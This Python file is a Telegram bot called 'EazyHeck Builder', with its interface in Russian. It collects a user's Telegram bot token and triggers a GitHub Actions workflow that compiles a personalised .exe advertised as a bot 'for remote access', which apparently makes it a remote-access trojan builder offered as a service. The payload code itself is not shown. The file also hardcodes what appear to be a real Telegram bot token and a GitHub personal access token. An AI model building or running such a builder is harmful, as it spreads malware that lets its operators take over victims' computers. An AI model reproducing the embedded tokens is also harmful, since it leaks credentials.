import asyncio
import logging
import re
import aiohttp
from aiogram import Bot, Dispatcher
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.client.default import DefaultBotProperties
from aiogram.filters import CommandStart
from aiogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton, CallbackQuery
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup

BUILDER_TOKEN = "7299338745:AAFdM5Q3M09pzN08p5-syJ1kYaZtQ8yiUck"
GITHUB_TOKEN = "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"
GITHUB_REPO = "unt1tledead/eazyheck-builder"
GITHUB_WORKFLOW = "build.yml"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BUILDER_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher(storage=MemoryStorage())

class BuildState(StatesGroup):
    waiting_token = State()

def is_valid_token(token: str) -> bool:
    return bool(re.match(r"^\d{8,12}:[A-Za-z0-9_-]{35,}$", token))

@dp.message(CommandStart())
async def start(message: Message):
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="🐀 Создать EazyHeck", callback_data="create")],
    ])
    await message.answer(
        "👋 <b>EazyHeck Builder</b>\n\n"
        "Создай своего бота для удалённого доступа.\n"
        "Просто введи токен — получи готовый <b>.exe</b>\n\n"
        "⏱ Время сборки: ~3 минуты",
        reply_markup=kb
    )

@dp.callback_query(lambda c: c.data == "create")
async def ask_token(callback: CallbackQuery, state: FSMContext):
    await callback.message.answer("🔑 Введи API токен твоего Telegram бота:\n\n<i>Получить у @BotFather → /newbot</i>")
    await state.set_state(BuildState.waiting_token)
    await callback.answer()

@dp.message(BuildState.waiting_token)
async def build(message: Message, state: FSMContext):
    await state.clear()
    token = message.text.strip()

    if not is_valid_token(token):
        await message.answer("❌ Неверный формат токена. Попробуй снова — /start")
        return

    msg = await message.answer("✅ Токен принят!\n🚀 Запускаю сборку...")

    async with aiohttp.ClientSession() as session:
        resp = await session.post(
            f"https://api.github.com/repos/{GITHUB_REPO}/actions/workflows/{GITHUB_WORKFLOW}/dispatches",
            headers={
                "Authorization": f"token {GITHUB_TOKEN}",
                "Accept": "application/vnd.github.v3+json"
            },
            json={
                "ref": "main",
                "inputs": {
                    "bot_token": token,
                    "chat_id": str(message.chat.id)
                }
            }
        )

    if resp.status == 204:
        await msg.edit_text(
            "⚙️ <b>Сборка запущена!</b>\n\n"
            "🔄 Компилирую EazyHeck под твой токен...\n"
            "⏱ Ожидай ~3 минуты — бот пришлёт ссылку автоматически"
        )
    else:
        text = await resp.text()
        await msg.edit_text(f"❌ Ошибка запуска сборки: {resp.status}\n<code>{text[:200]}</code>")

async def main():
    print("🤖 EazyHeck Builder запущен!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
